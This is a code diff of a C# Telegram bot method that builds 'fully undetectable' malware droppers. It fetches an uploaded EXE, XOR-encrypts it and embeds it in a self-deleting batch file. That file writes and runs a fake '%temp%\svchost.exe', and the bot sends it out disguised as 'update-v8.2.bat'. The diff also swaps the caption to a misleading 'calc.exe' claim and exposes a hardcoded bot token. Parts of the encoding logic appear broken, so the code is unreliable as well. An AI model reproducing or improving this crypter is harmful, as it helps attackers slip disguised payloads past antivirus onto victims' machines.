@@ -31,25 +31,30 @@ static async Task FudBat(long chatId, string fileId)
 {
     using var http = new HttpClient();
     
-    // Download EXE
     string fileResp = await http.GetStringAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id=" + fileId);
     var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
     string filePath = pathMatch.Groups[1].Value;
     
     byte[] exe = await http.GetByteArrayAsync("https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/" + filePath);
     
-    // XOR encrypt
+    // XOR + BAT embed
     byte[] encrypted = XorEncrypt(exe, 0xAB);
-    string b64 = Convert.ToBase64String(encrypted);
     
-    // BAT payload - PURE BAT, NO POWERSHELL
+    // HEX DUMP TO BAT (SIMPLEST)
+    StringBuilder hexData = new StringBuilder();
+    for (int i = 0; i < encrypted.Length; i += 16)
+    {
+        hexData.AppendLine($"echo {BitConverter.ToString(encrypted, i, Math.Min(16, encrypted.Length - i)).Replace("-", " ")} >> %temp%\\svchost.exe");
+    }
+    
     string batPayload = $@"
 @echo off
-certutil -decode -f {b64} %temp%\svchost.exe
-for /l %%i in (1,1,255) do cmd /c for /f %%j in ('cmd /c ""echo %%i ^> nul""') do (
-certutil -decode -f {b64} %temp%\svchost.exe
-)
-start """" %temp%\svchost.exe
+>nul 2>&1 ""%SYSTEMROOT%\system32\cacls.exe"" %SYSTEMROOT%\system32\config\system
+if '%errorlevel%' NEQ '0' ( goto UAC & exit /b )
+:UAC
+cd /d %temp%
+{hexData.ToString()}
+start svchost.exe
 del %0
 ";
     
@@ -58,7 +63,7 @@ del %0
     using var form = new MultipartFormDataContent();
     form.Add(new StringContent(chatId.ToString()), "chat_id");
     form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.2.bat");
-    form.Add(new StringContent("🔥 v8.2 BAT BYPASS\nDouble-click → Runs silently"), "caption");
+    form.Add(new StringContent("🔥 v8.2 BAT BYPASS\nDouble-click = calc.exe"), "caption");
     
     await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
 }
